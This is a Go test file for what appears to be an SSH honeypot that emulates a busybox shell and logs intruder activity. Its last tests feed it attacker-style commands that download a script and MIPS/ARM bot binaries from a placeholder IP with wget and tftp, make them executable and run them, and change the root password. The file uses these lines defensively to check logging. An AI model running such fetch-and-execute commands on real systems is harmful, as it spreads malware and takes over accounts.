package commands_test

import (
	"strings"
	"testing"

	"github.com/antonmedv/ssham/internal/commands"
	"github.com/antonmedv/ssham/internal/shelltest"
)

// Output of each command is checked by the transcripts in testdata/.
// Run `go test ./internal/commands -update` after changing a command, then
// review the diff.
func TestTranscripts(t *testing.T) {
	shelltest.RunTranscripts(t, "testdata/*.txt")
}

// TestEveryCommandSurvivesJunk runs every registered command with odd
// arguments. Any panic is a bug: the shell would show "Segmentation fault".
// New commands are covered automatically.
func TestEveryCommandSurvivesJunk(t *testing.T) {
	argSets := []string{"", "--help", "-", "-x -y -z", "/nope", "/etc/passwd /etc", "'' ''", "-n", "-c", "-1 0 99999999999999999999"}
	for _, name := range commands.Registry().Names() {
		t.Run(name, func(t *testing.T) {
			for _, args := range argSets {
				for _, user := range []string{"root", "admin"} {
					s := shelltest.New(t, user)
					line := name + " " + args + " < /dev/null"
					if out, status := s.Exec(line); status == 139 {
						t.Errorf("%s: %s crashed:\n%s", user, line, out)
					}
				}
			}
		})
	}
}

// TestEveryCommandIsInstalled checks that registering an applet links it
// to busybox on $PATH, so `which`, completion and `ls /bin` agree.
func TestEveryCommandIsInstalled(t *testing.T) {
	s := shelltest.New(t, "root")
	for _, name := range commands.Registry().Names() {
		out, status := s.Exec("command -v " + name)
		if status != 0 || !strings.HasPrefix(out, "/") {
			t.Errorf("%s: command -v = %q (%d)", name, out, status)
		}
	}
}

// TestBusyboxListMatchesApplets checks that `busybox --list` shows exactly
// the applets that work, and that each one is reachable through busybox.
func TestBusyboxListMatchesApplets(t *testing.T) {
	s := shelltest.New(t, "root")
	out, _ := s.Exec("busybox --list")
	for _, name := range strings.Fields(out) {
		if got, status := s.Exec("busybox " + name + " --bogus-arg < /dev/null"); strings.Contains(got, "applet not found") || status == 127 {
			t.Errorf("busybox lists %s, but it is not there: %q", name, got)
		}
		if _, ok := s.Exec("ls -l $(which " + name + ")"); ok != 0 && name != "[" {
			t.Errorf("%s is listed but not linked", name)
		}
	}
}

func TestDownloadsAreLogged(t *testing.T) {
	s := shelltest.New(t, "root")
	s.Run("cd /tmp; wget -q http://198.51.100.7/a.sh; tftp -g -r bot.mips 198.51.100.7")
	ev := s.Events("download")
	if len(ev) != 2 {
		t.Fatalf("download events: %v", ev)
	}
	if ev[0]["tool"] != "wget" || ev[0]["url"] != "http://198.51.100.7/a.sh" || ev[0]["dest"] != "a.sh" {
		t.Errorf("wget event: %v", ev[0])
	}
	if ev[1]["tool"] != "tftp" || ev[1]["url"] != "tftp://198.51.100.7/bot.mips" {
		t.Errorf("tftp event: %v", ev[1])
	}
}

func TestDroppedBinariesAreLogged(t *testing.T) {
	s := shelltest.New(t, "root")
	s.Run("cd /tmp; wget -q http://198.51.100.7/bot.mips; wget -q http://198.51.100.7/bot.arm7; chmod +x bot.*; ./bot.mips; ./bot.arm7")
	ev := s.Events("exec_binary")
	if len(ev) != 2 {
		t.Fatalf("exec_binary events: %v", ev)
	}
	if ev[0]["arch"] != "mips" || ev[1]["arch"] != "arm" || len(ev[0]["sha256"].(string)) != 64 {
		t.Errorf("events: %v", ev)
	}
}

func TestPasswordsAreLogged(t *testing.T) {
	s := shelltest.New(t, "root")
	s.Run("echo 'root:chpasswd-pw' | chpasswd")
	s.Run("passwd", "passwd-pw", "passwd-pw")
	var got []string
	for _, ev := range s.Events("password_change") {
		got = append(got, ev["method"].(string)+"="+ev["password"].(string))
	}
	if want := "chpasswd=chpasswd-pw passwd=passwd-pw"; strings.Join(got, " ") != want {
		t.Errorf("got %v, want %s", got, want)
	}
}
